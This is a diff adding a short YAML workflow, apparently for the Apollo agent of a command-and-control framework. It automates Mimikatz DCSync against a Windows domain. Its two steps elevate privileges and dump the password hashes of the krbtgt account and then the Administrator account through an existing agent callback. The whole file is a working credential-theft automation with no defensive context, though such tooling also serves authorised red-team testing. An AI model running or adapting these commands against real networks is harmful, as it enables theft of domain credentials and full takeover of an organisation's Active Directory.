@@ -1,0 +1,30 @@
+name: "Apollo Mimikatz DCSync"
+description: "Automates targeted DCSync via Apollo"
+trigger: manual
+run_as: self
+
+steps:
+  - name: "mimikatz krbtgt dump"
+    description: "Performs dcsync on the krbtgt account"
+    depends_on: []
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: mimikatz
+      params: '"privilege::debug" "token::elevate" "lsadump::dcsync /user:krbtgt" exit'
+
+  - name: "mimikatz administrator dump"
+    description: "Perform lsadump"
+    depends_on:
+      - "mimikatz krbtgt dump"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: mimikatz
+      params: '"privilege::debug" "token::elevate" "lsadump::dcsync /user:Administrator" exit'
